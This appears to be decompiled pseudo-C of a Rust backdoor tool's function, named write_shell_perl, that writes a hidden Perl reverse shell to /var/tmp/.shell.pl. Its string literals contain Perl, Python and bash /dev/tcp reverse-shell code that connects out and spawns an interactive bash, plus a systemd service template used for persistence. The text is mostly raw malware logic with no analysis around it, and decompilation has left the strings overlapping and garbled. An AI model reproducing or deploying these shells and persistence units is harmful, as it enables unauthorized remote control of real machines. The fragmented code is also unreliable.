long long backdoorautomater::newservice::write_shell_perl(struct_0 *a0, struct_0 *a1)
{
    unsigned int v0;  // [bp-0x8c]
    char v1;  // [bp-0x88], Other Possible Types: unsigned long
    unsigned int v2;  // [bp-0x84]
    void* v3;  // [bp-0x80], Other Possible Types: unsigned long long
    int v4;  // [bp-0x78]
    int v5;  // [bp-0x68]
    unsigned long long v6;  // [bp-0x60]
    unsigned long long v7;  // [bp-0x58]
    int v8;  // [bp-0x48]
    unsigned long long v9;  // [bp-0x40]
    unsigned long long v10;  // [bp-0x38]
    int v11;  // [bp-0x30], Other Possible Types: char
    char v12;  // [bp-0x20]
    void* v14;  // r15
    int v15;  // xmm0
    int v16;  // xmm0

    v1.create("/var/tmp/.shell.pl  -e /bin/bash\n/ 0>&1'\nExecStart=nc [Unit]\nDescription=My Custom Service\nAfter=network-online.target\n\n[Service]\nExecStartPre=/bin/sleep 15\nType=simple\n\n[Install]\nWantedBy=default.target\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ExecStar", 18);
    if (*((int *)&v1))
    {
        v14 = v3;
    }
    else
    {
        v0 = v2;
        v14 = v0.write_all("use Socket;\n$p=socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));\nif(connect(S,sockaddr_in($p,inet_aton($i)))){\nopen(STDIN,'>&S');\nopen(STDOUT,'>&S');\nopen(STDERR,'>&S');\nexec('/usr/bin/bash -i');\n};\n", 12);
        if (!v14)
        {
            v15 = *((int128_t *)&(&a1->padding_0)[1]);
            v1 = "$i='kindNoneSomeZeroIpv4Ipv6info";
            v3 = 4;
            v4 = v15;
            alloc::str::join_generic_copy(&v11, &v1, 2, 1, 0);
            v7 = *((long long *)&v12);
            v5 = v11;
            (char)v5.extend_from_slice("';\nimport socket,subprocess,os;\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\nv_ip='os.dup2(s.fileno(),0);\nos.dup2(s.fileno(),1);\nos.dup2(s.fileno(),2);\nv_shell_path='/usr/bin/bash';\nv_shell_value='-i';\np=subprocess.call([v_shell_path,v_shell_value])", 3);
            v14 = v0.write_all(v6, v7);
            if (!v14)
            {
                v16 = *((int128_t *)&(&a0->padding_0)[1]);
                v1 = "$p=socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));\nif(connect(S,sockaddr_in($p,inet_aton($i)))){\nopen(STDIN,'>&S');\nopen(STDOUT,'>&S');\nopen(STDERR,'>&S');\nexec('/usr/bin/bash -i');\n};\n";
                v3 = 3;
                v4 = v16;
                alloc::str::join_generic_copy(&v11, &v1, 2, 1, 0);
                v10 = *((long long *)&v12);
                v8 = v11;
                (char)v8.extend_from_slice(";\nuse Socket;\n$p=socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));\nif(connect(S,sockaddr_in($p,inet_aton($i)))){\nopen(STDIN,'>&S');\nopen(STDOUT,'>&S');\nopen(STDERR,'>&S');\nexec('/usr/bin/bash -i');\n};\n", 2);
                v14 = v0.write_all(v9, v10);
                if (!v14)
                {
                    v14 = v0.write_all("socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));\nif(connect(S,sockaddr_in($p,inet_aton($i)))){\nopen(STDIN,'>&S');\nopen(STDOUT,'>&S');\nopen(STDERR,'>&S');\nexec('/usr/bin/bash -i');\n};\n", 53);
                    if (!v14)
                    {
                        v14 = v0.write_all("if(connect(S,sockaddr_in($p,inet_aton($i)))){\nopen(STDIN,'>&S');\nopen(STDOUT,'>&S');\nopen(STDERR,'>&S');\nexec('/usr/bin/bash -i');\n};\n", 46);
                        if (!v14)
                        {
                            v14 = v0.write_all("open(STDIN,'>&S');\nopen(STDOUT,'>&S');\nopen(STDERR,'>&S');\nexec('/usr/bin/bash -i');\n};\n", 19);
                            if (!v14)
                            {
                                v14 = v0.write_all("open(STDOUT,'>&S');\nopen(STDERR,'>&S');\nexec('/usr/bin/bash -i');\n};\n", 20);
                                if (!v14)
                                {
                                    v14 = v0.write_all("open(STDERR,'>&S');\nexec('/usr/bin/bash -i');\n};\n", 20);
                                    if (!v14)
                                    {
                                        v14 = v0.write_all("exec('/usr/bin/bash -i');\n};\n", 26);
                                        if (!v14)
                                        {
                                            v14 = v0.write_all("};\n", 3);
                                            if (!v14)
                                            {
                                                ::0x456150::core::ptr::drop_in_place<alloc::string::String>(&(char)v8);
                                                ::0x456150::core::ptr::drop_in_place<alloc::string::String>(&(char)v5);
                                                ::0x456100::core::ptr::drop_in_place<std::fs::File>(v0);
                                                ::0x456150::core::ptr::drop_in_place<alloc::string::String>(a1);
                                                ::0x456150::core::ptr::drop_in_place<alloc::string::String>(a0);
                                                return 0;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                ::0x456150::core::ptr::drop_in_place<alloc::string::String>(&(char)v8);
            }
            ::0x456150::core::ptr::drop_in_place<alloc::string::String>(&(char)v5);
        }
        ::0x456100::core::ptr::drop_in_place<std::fs::File>(v0);
    }
    ::0x456150::core::ptr::drop_in_place<alloc::string::String>(a1);
    ::0x456150::core::ptr::drop_in_place<alloc::string::String>(a0);
    return v14;
}
